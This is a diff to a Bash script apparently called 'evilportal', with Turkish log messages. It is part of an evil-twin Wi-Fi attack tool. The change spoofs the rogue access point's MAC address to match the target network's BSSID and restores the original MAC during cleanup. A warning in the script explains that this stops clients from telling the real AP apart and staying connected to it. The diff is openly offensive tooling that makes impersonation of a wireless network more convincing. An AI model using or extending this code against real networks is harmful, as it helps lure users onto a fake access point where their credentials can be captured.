@@ -161,6 +161,7 @@ flock -n 9 || die "başka bir evilportal oturumu çalışıyor ($LOCK)"
 
 ORIG_IPFWD=$(cat /proc/sys/net/ipv4/ip_forward 2>/dev/null || echo 0)
 ORIG_MON="$MON_IF"
+ORIG_AP_MAC=$(cat "/sys/class/net/$AP_IF/address" 2>/dev/null || echo "")
 CLEANED=0
 
 cleanup() {
@@ -213,6 +214,9 @@ cleanup() {
 
   ip addr flush dev "$AP_IF" 2>/dev/null
   ip link set "$AP_IF" down 2>/dev/null
+  if [[ -n "$ORIG_AP_MAC" ]]; then
+    ip link set "$AP_IF" address "$ORIG_AP_MAC" 2>/dev/null || true
+  fi
 
   ep_nm_restart
   log "Temiz."
@@ -259,6 +263,12 @@ iw dev "$MON_IF" set power_save off 2>/dev/null || true
 log "AP arayüzü: $AP_IF → $GATEWAY_IP/$SUBNET_MASK"
 ip link set "$AP_IF" down 2>/dev/null
 ip addr flush dev "$AP_IF" 2>/dev/null
+if ip link set "$AP_IF" address "$TARGET_BSSID" 2>/dev/null; then
+  log "AP MAC'i hedef BSSID ile eşleştirildi: $TARGET_BSSID"
+else
+  warn "AP MAC'i değiştirilemedi (kart desteklemiyor olabilir) — istemciler" \
+       "gerçek AP'yi farklı BSSID'den ayırt edip ona bağlı kalabilir"
+fi
 ip addr add "$GATEWAY_IP/$SUBNET_MASK" dev "$AP_IF" \
   || die "IP atanamadı: $GATEWAY_IP/$SUBNET_MASK → $AP_IF"
 ip link set "$AP_IF" up || die "AP arayüzü açılamadı: $AP_IF"
